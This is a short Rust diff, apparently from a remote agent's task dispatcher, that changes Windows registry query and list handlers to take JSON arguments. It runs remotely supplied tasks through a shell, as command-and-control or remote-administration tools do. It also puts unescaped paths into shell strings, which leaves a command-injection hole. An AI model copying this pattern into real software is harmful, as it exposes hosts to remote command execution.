@@ -1763,11 +1763,29 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         }
         #[cfg(target_os = "windows")]
         "REG_QUERY" => {
-            t.send_result(task.id, &shell(&format!("reg query \"{}\" 2>&1", task.args)), "");
+            let raw = task.args.trim();
+            let j = serde_json::from_str::<serde_json::Value>(raw).ok();
+            let path = j.as_ref()
+                .and_then(|v| v.get("path")).and_then(|v| v.as_str())
+                .unwrap_or(raw);
+            let name = j.as_ref()
+                .and_then(|v| v.get("name")).and_then(|v| v.as_str())
+                .unwrap_or("");
+            let cmd = if name.is_empty() {
+                format!("reg query \"{}\" 2>&1", path)
+            } else {
+                format!("reg query \"{}\" /v \"{}\" 2>&1", path, name)
+            };
+            t.send_result(task.id, &shell(&cmd), "");
         }
         #[cfg(target_os = "windows")]
         "REG_LIST" => {
-            t.send_result(task.id, &shell(&format!("reg query \"{}\" /s 2>&1", task.args)), "");
+            let raw = task.args.trim();
+            let j = serde_json::from_str::<serde_json::Value>(raw).ok();
+            let path = j.as_ref()
+                .and_then(|v| v.get("path")).and_then(|v| v.as_str())
+                .unwrap_or(raw);
+            t.send_result(task.id, &shell(&format!("reg query \"{}\" /s 2>&1", path)), "");
         }
         #[cfg(target_os = "windows")]
         "REG_SET" => {
